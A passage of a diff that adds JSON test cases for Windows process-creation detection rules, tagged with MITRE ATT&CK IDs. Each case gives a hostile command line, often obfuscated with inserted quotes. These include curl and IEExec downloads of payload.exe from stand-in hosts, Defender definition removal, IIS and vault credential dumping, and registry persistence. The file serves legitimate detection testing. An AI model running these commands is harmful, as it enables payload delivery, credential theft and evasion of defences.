+        "technique_id":  "T1082"
+    },
+    {
+        "test_id":  "proc_creation_win_desktopimgdownldr_susp_execution_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c set \"SYSTEMROOT=C:\\Windows\\Temp\" \u0026\u0026 cmd /c desktopimgdownldr.exe /lockscreen\"url\":https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",
+        "target_rule":  "proc_creation_win_desktopimgdownldr_susp_execution",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_desktopimgdownldr_susp_execution_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c desktopimgdownldr.exe \"/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md\" /eventName:desktopimgdownldr",
+        "target_rule":  "proc_creation_win_desktopimgdownldr_susp_execution",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_desktopimgdownldr_susp_execution_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c desktopimgdownldr.exe /eventName:desktopimgdownldr \"/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md\"",
+        "target_rule":  "proc_creation_win_desktopimgdownldr_susp_execution",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_desktopimgdownldr_susp_execution_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\desktopimgdownldr.exe \"/lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md\" /eventName:desktopimgdownldr",
+        "target_rule":  "proc_creation_win_desktopimgdownldr_susp_execution",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_printbrm_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -B \"-f\" C:\\temp\\backup.zip",
+        "target_rule":  "proc_creation_win_lolbin_printbrm",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_lolbin_printbrm_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -B -f \"C:\\temp\\backup.z\"ip",
+        "target_rule":  "proc_creation_win_lolbin_printbrm",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_certoc_download_direct_ip_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\CERTOC.EXE -Get\"CACAPS\" http://203.0.113.50/CertSrv/",
+        "target_rule":  "proc_creation_win_certoc_download_direct_ip",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_ieexec_download_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\IEExec.exe h\"ttp://\"127.0.0.1/payload.exe",
+        "target_rule":  "proc_creation_win_ieexec_download",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_browsers_inline_file_download_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" http://example.com/app.hta --minimized",
+        "target_rule":  "proc_creation_win_browsers_inline_file_download",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_desktopimgdownldr_remote_file_download_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\desktopimgdownldr.exe /\"lockscreenurl\":http://127.0.0.1/payload.exe /eventName:test",
+        "target_rule":  "proc_creation_win_desktopimgdownldr_remote_file_download",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_curl_download_direct_ip_exec_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\curl.exe http://0x01010101/payload.exe -O",
+        "target_rule":  "proc_creation_win_curl_download_direct_ip_exec",
+        "technique_id":  "T1105"
+    },
+    {
+        "test_id":  "proc_creation_win_vaultcmd_list_creds_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\VaultCmd.exe \"/list\"\"creds:Web Credentials\" /all",
+        "target_rule":  "proc_creation_win_vaultcmd_list_creds",
+        "technique_id":  "T1555.004"
+    },
+    {
+        "test_id":  "proc_creation_win_vaultcmd_list_creds_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\VaultCmd.exe /list\"\"creds:\"Windows Credentials\" /all",
+        "target_rule":  "proc_creation_win_vaultcmd_list_creds",
+        "technique_id":  "T1555.004"
+    },
+    {
+        "test_id":  "proc_creation_win_vaultcmd_list_creds_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\vaultcmd.EXE /\"listcreds:\"\"Windows Credentials\"",
+        "target_rule":  "proc_creation_win_vaultcmd_list_creds",
+        "technique_id":  "T1555.004"
+    },
+    {
+        "test_id":  "proc_creation_win_msiexec_web_install_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\msiexec.exe /i http://example.com/test.msi",
+        "target_rule":  "proc_creation_win_msiexec_web_install",
+        "technique_id":  "T1218.007"
+    },
+    {
+        "test_id":  "proc_creation_win_msiexec_web_install_curated_2",
+        "target_commandline":  "msiexec /i http:\"//\"example.com/test.msi",
+        "target_rule":  "proc_creation_win_msiexec_web_install",
+        "technique_id":  "T1218.007"
+    },
+    {
+        "test_id":  "proc_creation_win_msiexec_web_install_curated_3",
+        "target_commandline":  "msiexec /i http://example.com/test.msi",
+        "target_rule":  "proc_creation_win_msiexec_web_install",
+        "technique_id":  "T1218.007"
+    },
+    {
+        "test_id":  "proc_creation_win_msiexec_execute_dll_curated_1",
+        "target_commandline":  "c:\\windows\\system32\\msiexec.exe \"/y\" \"C:\\AtomicRedTeam\\atomics\\T1218.007\\bin\\MSIRunner.dll\"",
+        "target_rule":  "proc_creation_win_msiexec_execute_dll",
+        "technique_id":  "T1218.007"
+    },
+    {
+        "test_id":  "proc_creation_win_msiexec_execute_dll_curated_2",
+        "target_commandline":  "c:\\windows\\system32\\msiexec.exe \"-y\" \"C:\\AtomicRedTeam\\atomics\\T1218.007\\bin\\MSIRunner.dll\"",
+        "target_rule":  "proc_creation_win_msiexec_execute_dll",
+        "technique_id":  "T1218.007"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_task_folder_evasion_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"echo payload \u003e %SystemRoot%\\System32\\Tasks\\payload.exe\"",
+        "target_rule":  "proc_creation_win_susp_task_folder_evasion",
+        "technique_id":  "T1574.001"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_task_folder_evasion_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"echo payload \u003e \"C:\\Windows\\System32\\Tasks\\payload.exe\"\"",
+        "target_rule":  "proc_creation_win_susp_task_folder_evasion",
+        "technique_id":  "T1574.001"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_task_folder_evasion_curated_3",
+        "target_commandline":  "cmd.exe /c copy C:\\temp\\payload.exe \"C:/Windows/SysWow64/Tasks/payload.exe\"",
+        "target_rule":  "proc_creation_win_susp_task_folder_evasion",
+        "technique_id":  "T1574.001"
+    },
+    {
+        "test_id":  "proc_creation_win_odbcconf_register_dll_regsvr_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\odbcconf.exe /S /A {REGSVR\t\"C:\\AtomicRedTeam\\atomics\\T1218.008\\src\\Win32\\T1218-2.dll\"}",
+        "target_rule":  "proc_creation_win_odbcconf_register_dll_regsvr",
+        "technique_id":  "T1218.008"
+    },
+    {
+        "test_id":  "proc_creation_win_odbcconf_register_dll_regsvr_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\odbcconf.exe /S /A {\"REGSVR\" \"C:\\AtomicRedTeam\\atomics\\T1218.008\\src\\Win32\\T1218-2.dll\"}",
+        "target_rule":  "proc_creation_win_odbcconf_register_dll_regsvr",
+        "technique_id":  "T1218.008"
+    },
+    {
+        "test_id":  "proc_creation_win_odbcconf_register_dll_regsvr_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\odbcconf.exe /S /A {REG\"\"SVR \"C:\\AtomicRedTeam\\atomics\\T1218.008\\src\\Win32\\T1218-2.dll\"}",
+        "target_rule":  "proc_creation_win_odbcconf_register_dll_regsvr",
+        "technique_id":  "T1218.008"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_dumpstack_log_evasion_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\curl.EXE -oDumpStack.log http://malicious.com/payload.exe",
+        "target_rule":  "proc_creation_win_susp_dumpstack_log_evasion",
+        "technique_id":  "T1562.001"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_dumpstack_log_evasion_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\curl.EXE -o  DumpStack.log http://malicious.com/payload.exe",
+        "target_rule":  "proc_creation_win_susp_dumpstack_log_evasion",
+        "technique_id":  "T1562.001"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_dumpstack_log_evasion_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\curl.EXE -o \"DumpStack.log\" http://malicious.com/payload.exe",
+        "target_rule":  "proc_creation_win_susp_dumpstack_log_evasion",
+        "technique_id":  "T1562.001"
+    },
+    {
+        "test_id":  "proc_creation_win_mpcmdrun_remove_windows_defender_definition_curated_1",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Windows Defender\\MpCmdRun.exe\" \"-RemoveDefinitions\" \"-All\"",
+        "target_rule":  "proc_creation_win_mpcmdrun_remove_windows_defender_definition",
+        "technique_id":  "T1562.001"
+    },
+    {
+        "test_id":  "proc_creation_win_mpcmdrun_remove_windows_defender_definition_curated_2",
+        "target_commandline":  "\"C:\\Program Files (x86)\\Windows Defender\\MpCmdRun.exe\"\t-RemoveDefinitions\t-All",
+        "target_rule":  "proc_creation_win_mpcmdrun_remove_windows_defender_definition",
+        "technique_id":  "T1562.001"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_office_disable_python_security_warnings_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" /v PythonFunctionWarnings /t REG_DWORD /d \"0\" /f",
+        "target_rule":  "proc_creation_win_registry_office_disable_python_security_warnings",
+        "technique_id":  "T1562.001"
+    },
+    {
+        "test_id":  "proc_creation_win_sc_service_tamper_for_persistence_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c reg.exe add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"C:\\Program Files\\Internet Explorer\\iexplore.exe\"",
+        "target_rule":  "proc_creation_win_sc_service_tamper_for_persistence",
+        "technique_id":  "T1543.003"
+    },
+    {
+        "test_id":  "proc_creation_win_sc_service_tamper_for_persistence_curated_2",
+        "target_commandline":  "reg.exe add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"C:\\Program Files\\Internet Explorer\\iexplore.exe\"",
+        "target_rule":  "proc_creation_win_sc_service_tamper_for_persistence",
+        "technique_id":  "T1543.003"
+    },
+    {
+        "test_id":  "proc_creation_win_sc_service_tamper_for_persistence_curated_3",
+        "target_commandline":  "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v Im\"\"agePath /t REG_SZ /d \"C:\\Program Files\\Internet Explorer\\iexplore.exe\"",
+        "target_rule":  "proc_creation_win_sc_service_tamper_for_persistence",
+        "technique_id":  "T1543.003"
+    },
+    {
+        "test_id":  "proc_creation_win_regasm_regsvcs_uncommon_location_execution_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe C:/Users/Public/payload.dll",
+        "target_rule":  "proc_creation_win_regasm_regsvcs_uncommon_location_execution",
+        "technique_id":  "T1218.009"
+    },
+    {
+        "test_id":  "proc_creation_win_regasm_regsvcs_uncommon_location_execution_curated_2",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe C:\\Users\\.\\Public\\payload.dll",
+        "target_rule":  "proc_creation_win_regasm_regsvcs_uncommon_location_execution",
+        "technique_id":  "T1218.009"
+    },
+    {
+        "test_id":  "proc_creation_win_regasm_regsvcs_uncommon_location_execution_curated_3",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe \"C:\\Users\\\"Public\"\\payload.dll\"",
+        "target_rule":  "proc_creation_win_regasm_regsvcs_uncommon_location_execution",
+        "technique_id":  "T1218.009"
+    },
+    {
+        "test_id":  "proc_creation_win_regasm_no_flag_or_dll_execution_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe",
+        "target_rule":  "proc_creation_win_regasm_no_flag_or_dll_execution",
+        "technique_id":  "T1218.009"
+    },
+    {
+        "test_id":  "proc_creation_win_regasm_no_flag_or_dll_execution_curated_2",
+        "target_commandline":  "\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\"",
+        "target_rule":  "proc_creation_win_regasm_no_flag_or_dll_execution",
+        "technique_id":  "T1218.009"
+    },
+    {
+        "test_id":  "proc_creation_win_office_exec_from_trusted_locations_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" C:\\Users\\user\\AppData\\Roaming\\Microsoft\\.\\Templates\\payload.exe",
+        "target_rule":  "proc_creation_win_office_exec_from_trusted_locations",
+        "technique_id":  "T1202"
+    },
+    {
+        "test_id":  "proc_creation_win_office_exec_from_trusted_locations_curated_2",
+        "target_commandline":  "cmd.exe /c \"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Templates\\payload.exe\"\"",
+        "target_rule":  "proc_creation_win_office_exec_from_trusted_locations",
+        "technique_id":  "T1202"
+    },
+    {
+        "test_id":  "proc_creation_win_office_exec_from_trusted_locations_curated_3",
+        "target_commandline":  "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" C:/Users/user/AppData/Roaming/Microsoft/Templates/payload.exe",
+        "target_rule":  "proc_creation_win_office_exec_from_trusted_locations",
+        "technique_id":  "T1202"
+    },
+    {
+        "test_id":  "proc_creation_win_ksetup_password_change_user_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\ksetup.exe \"/ChangePassword\" admin password",
+        "target_rule":  "proc_creation_win_ksetup_password_change_user",
+        "technique_id":  "T1098"
+    },
+    {
+        "test_id":  "proc_creation_win_ksetup_password_change_user_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\ksetup.exe /ChangePassword\tadmin password",
+        "target_rule":  "proc_creation_win_ksetup_password_change_user",
+        "technique_id":  "T1098"
+    },
+    {
+        "test_id":  "proc_creation_win_ksetup_password_change_user_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\ksetup.exe /ChangeP\"\"assword admin password",
+        "target_rule":  "proc_creation_win_ksetup_password_change_user",
+        "technique_id":  "T1098"
+    },
+    {
+        "test_id":  "proc_creation_win_hh_chm_execution_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\hh.exe -decompile C:\\Users\\bkcs\\AppData\\Local\\Temp \"C:\\AtomicRedTeam\\atomics\\T1218.001\\src\\T1218.001.c\"\"hm\"",
+        "target_rule":  "proc_creation_win_hh_chm_execution",
+        "technique_id":  "T1218.001"
+    },
+    {
+        "test_id":  "proc_creation_win_hh_chm_execution_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\hh.exe \"C:\\AtomicRedTeam\\atomics\\T1218.001\\src\\T1218.001.c\"\"hm\"",
+        "target_rule":  "proc_creation_win_hh_chm_execution",
+        "technique_id":  "T1218.001"
+    },
+    {
+        "test_id":  "proc_creation_win_hh_chm_execution_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\hh.exe \"C:/AtomicRedTeam/atomics/T1218.001/src/T1218.001.c\"\"hm\"",
+        "target_rule":  "proc_creation_win_hh_chm_execution",
+        "technique_id":  "T1218.001"
+    },
+    {
+        "test_id":  "proc_creation_win_bcp_export_data_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\180\\Tools\\Binn\\bcp.exe\" TestDB.dbo.TestTable \"out\" C:\\Temp\\test.txt -c -T",
+        "target_rule":  "proc_creation_win_bcp_export_data",
+        "technique_id":  "T1048"
+    },
+    {
+        "test_id":  "proc_creation_win_bcp_export_data_curated_2",
+        "target_commandline":  "\"C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\180\\Tools\\Binn\\bcp.exe\" TestDB.dbo.TestTable\tout\tC:\\Temp\\test.txt -c -T",
+        "target_rule":  "proc_creation_win_bcp_export_data",
+        "technique_id":  "T1048"
+    },
+    {
+        "test_id":  "proc_creation_win_bcp_export_data_curated_3",
+        "target_commandline":  "\"C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\180\\Tools\\Binn\\bcp.exe\" TestDB.dbo.TestTable o\"\"ut C:\\Temp\\test.txt -c -T",
+        "target_rule":  "proc_creation_win_bcp_export_data",
+        "technique_id":  "T1048"
+    },
+    {
+        "test_id":  "proc_creation_win_esentutl_params_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\esentutl.exe \"/p\" C:\\temp\\database.edb",
+        "target_rule":  "proc_creation_win_esentutl_params",
+        "technique_id":  "T1003"
+    },
+    {
+        "test_id":  "proc_creation_win_esentutl_params_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\es\"en\"tutl.exe /p C:\\temp\\database.edb",
+        "target_rule":  "proc_creation_win_esentutl_params",
+        "technique_id":  "T1003"
+    },
+    {
+        "test_id":  "proc_creation_win_esentutl_params_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\esentutl.exe\t/p C:\\temp\\database.edb",
+        "target_rule":  "proc_creation_win_esentutl_params",
+        "technique_id":  "T1003"
+    },
+    {
+        "test_id":  "proc_creation_win_iis_appcmd_service_account_password_dumped_curated_1",
+        "target_commandline":  "C:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.26100.7920_none_4519672c203c0275\\appcmd.exe \"list\" apppool /text:password",
+        "target_rule":  "proc_creation_win_iis_appcmd_service_account_password_dumped",
+        "technique_id":  "T1003"
+    },
+    {
+        "test_id":  "proc_creation_win_iis_appcmd_service_account_password_dumped_curated_2",
+        "target_commandline":  "C:\\Windows\\WinSxS\\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.26100.7920_none_4519672c203c0275\\appcmd.exe list apppool \"/text:password\"",
+        "target_rule":  "proc_creation_win_iis_appcmd_service_account_password_dumped",
+        "technique_id":  "T1003"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_shadow_copies_creation_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\vssadmin.exe c\"r\"eate s\"h\"adow /for=C:",
+        "target_rule":  "proc_creation_win_susp_shadow_copies_creation",
+        "technique_id":  "T1003"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_enable_windows_recall_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.exe add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\\"WindowsAI /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f",
+        "target_rule":  "proc_creation_win_reg_enable_windows_recall",
+        "technique_id":  "T1113"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_enable_windows_recall_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.exe delete HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI /v Dis\"ableAI\"DataAnalysis /f",
+        "target_rule":  "proc_creation_win_reg_enable_windows_recall",
+        "technique_id":  "T1113"
+    },
+    {
+        "test_id":  "proc_creation_win_psr_capture_screenshots_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\psr.exe /st\"\"art /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12",
+        "target_rule":  "proc_creation_win_psr_capture_screenshots",
+        "technique_id":  "T1113"
+    },
+    {
+        "test_id":  "proc_creation_win_psr_capture_screenshots_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\psr.exe /s\"ta\"rt /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12",
+        "target_rule":  "proc_creation_win_psr_capture_screenshots",
+        "technique_id":  "T1113"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_enumeration_for_credentials_cli_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c reg query HKCU\\Software\\\"SimonTatham\"\\PuTTY\\Sessions /t REG_SZ /s",
+        "target_rule":  "proc_creation_win_registry_enumeration_for_credentials_cli",
+        "technique_id":  "T1552.002"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_enumeration_for_credentials_cli_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE query \"HKCU\\Software\\SimonTatham\\\"PuTTY\"\\Sessions\" /t REG_SZ /s",
+        "target_rule":  "proc_creation_win_registry_enumeration_for_credentials_cli",
+        "technique_id":  "T1552.002"
+    },
+    {
+        "test_id":  "proc_creation_win_browsers_chromium_load_extension_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load\"\"-extension=\"C:\\Temp\\test_extension\"",
+        "target_rule":  "proc_creation_win_browsers_chromium_load_extension",
+        "technique_id":  "T1176.001"
+    },
+    {
+        "test_id":  "proc_creation_win_browsers_chromium_load_extension_curated_2",
+        "target_commandline":  "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --\"load-extension\"=\"C:\\Temp\\test_extension\"",
+        "target_rule":  "proc_creation_win_browsers_chromium_load_extension",
+        "technique_id":  "T1176.001"
+    },
+    {
+        "test_id":  "proc_creation_win_at_interactive_execution_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\at.EXE 13:20 /inter\"\"active cmd",
+        "target_rule":  "proc_creation_win_at_interactive_execution",
+        "technique_id":  "T1053.002"
+    },
+    {
+        "test_id":  "proc_creation_win_at_interactive_execution_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\at.EXE 13:20 /inter\"active\" cmd",
+        "target_rule":  "proc_creation_win_at_interactive_execution",
+        "technique_id":  "T1053.002"
+    },
+    {
+        "test_id":  "proc_creation_win_control_panel_item_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.exe a\"d\"d \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLs\" /v payload /t REG_SZ /d C:\\temp\\malware.cpl",
+        "target_rule":  "proc_creation_win_control_panel_item",
+        "technique_id":  "T1218.002"
+    },
+    {
+        "test_id":  "proc_creation_win_control_panel_item_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\\"CPLs /v payload /t REG_SZ /d C:\\temp\\malware.cpl",
+        "target_rule":  "proc_creation_win_control_panel_item",
+        "technique_id":  "T1218.002"
+    },
+    {
+        "test_id":  "proc_creation_win_conhost_headless_powershell_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\conhost.exe --head\"\"less powershell.exe -c whoami",
+        "target_rule":  "proc_creation_win_conhost_headless_powershell",
+        "technique_id":  "T1059.001"
+    },
+    {
+        "test_id":  "proc_creation_win_conhost_headless_powershell_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\conhost.exe --headless p\"\"owershell.exe -c whoami",
+        "target_rule":  "proc_creation_win_conhost_headless_powershell",
+        "technique_id":  "T1059.001"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_no_space_execution_curated_1",
+        "target_commandline":  "cmd.exe  /k powershell",
+        "target_rule":  "proc_creation_win_cmd_no_space_execution",
+        "technique_id":  "T1059.001"
+    },
+    {
+        "test_id":  "proc_creation_win_powershell_encode_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=",
+        "target_rule":  "proc_creation_win_powershell_encode",
+        "technique_id":  "T1059.001"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_cli_obfuscation_escape_char_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"echo ht^tp://malicious.com\"",
+        "target_rule":  "proc_creation_win_susp_cli_obfuscation_escape_char",
+        "technique_id":  "T1140"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_cli_obfuscation_escape_char_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"echo h\"\"t\"\"t\"\"p://malicious.com\"",
+        "target_rule":  "proc_creation_win_susp_cli_obfuscation_escape_char",
+        "technique_id":  "T1140"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_gather_network_info_execution_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cscript.exe C:\\Windows\\System32\\gather\"NetworkInfo.vbs\"",
+        "target_rule":  "proc_creation_win_susp_gather_network_info_execution",
+        "technique_id":  "T1615"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_gather_network_info_execution_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cscript.exe \"C:\\Windows\\System32\\gatherNetworkInfo\".vbs",
+        "target_rule":  "proc_creation_win_susp_gather_network_info_execution",
+        "technique_id":  "T1615"
+    },
+    {
+        "test_id":  "proc_creation_win_gpresult_execution_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\gpresult.exe /\"z\"",
+        "target_rule":  "proc_creation_win_gpresult_execution",
+        "technique_id":  "T1615"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_del_execution_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c del\"\" %%TEMP%%\\PrintBrm.zip \u003enul 2\u003e\u00261 \u0026 C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\ \"-f\" %%TEMP%%\\PrintBrm.zip -O FORCE",
+        "target_rule":  "proc_creation_win_cmd_del_execution",
+        "technique_id":  "T1070.004"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_del_execution_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c pushd \\\\localhost\\C$ \u0026 echo var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); \u003e AtomicTestT1105.js \u0026 CScript.exe AtomicTestT1105.js //E:JScript \u0026 d^e^l AtomicTestT1105.js /Q \u003enul 2\u003e\u00261 \u0026 d^e^l AtomicTestFileT1105.js /Q \u003enul 2\u003e\u00261 \u0026 popd",
+        "target_rule":  "proc_creation_win_cmd_del_execution",
+        "technique_id":  "T1070.004"
+    },
+    {
+        "test_id":  "proc_creation_win_cmd_ping_del_combined_execution_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c \"ping -n 5 127.0.0.1 \u003e Nul \u0026 del\"\" /f /q C:\\temp\\malware.exe\"",
+        "target_rule":  "proc_creation_win_cmd_ping_del_combined_execution",
+        "technique_id":  "T1070.004"
+    },
+    {
+        "test_id":  "proc_creation_win_cloudflared_tunnel_run_curated_1",
+        "target_commandline":  "C:\\Tools\\cloudflared.exe \"tunnel\" \"run\" -credentials-file C:\\Temp\\test.json",
+        "target_rule":  "proc_creation_win_cloudflared_tunnel_run",
+        "technique_id":  "T1102"
+    },
+    {
+        "test_id":  "proc_creation_win_cloudflared_tunnel_run_curated_2",
+        "target_commandline":  "C:\\\\Tools\\\\cloudflared.exe \"tunnel\" run -credentials-file C:\\\\Temp\\\\test.json",
+        "target_rule":  "proc_creation_win_cloudflared_tunnel_run",
+        "technique_id":  "T1102"
+    },
+    {
+        "test_id":  "proc_creation_win_cloudflared_tunnel_cleanup_curated_1",
+        "target_commandline":  "C:\\Tools\\cloudflared.exe \"tunnel\" \"cleanup\" -connector-id 99999999-8888-7777-6666-555555555555",
+        "target_rule":  "proc_creation_win_cloudflared_tunnel_cleanup",
+        "technique_id":  "T1102"
+    },
+    {
+        "test_id":  "proc_creation_win_cloudflared_tunnel_cleanup_curated_2",
+        "target_commandline":  "C:\\Tools\\cloudflared.exe tunnel cleanup \"-connector-id\" 99999999-8888-7777-6666-555555555555",
+        "target_rule":  "proc_creation_win_cloudflared_tunnel_cleanup",
+        "technique_id":  "T1102"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_pingcastle_script_parent_curated_1",
+        "target_commandline":  "C:\\Tools\\PingCastle.exe \"--healthcheck\" \"--level\" \"Full\"",
+        "target_rule":  "proc_creation_win_pua_pingcastle_script_parent",
+        "technique_id":  "T1595"
+    },
+    {
+        "test_id":  "proc_creation_win_pua_pingcastle_script_parent_curated_2",
+        "target_commandline":  "C:\\Tools\\PingCastle.exe --healthcheck  --level   Full",
+        "target_rule":  "proc_creation_win_pua_pingcastle_script_parent",
+        "technique_id":  "T1595"
+    },
+    {
+        "test_id":  "proc_creation_win_nltest_recon_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\nltest.EXE /domain\"\"_trusts",
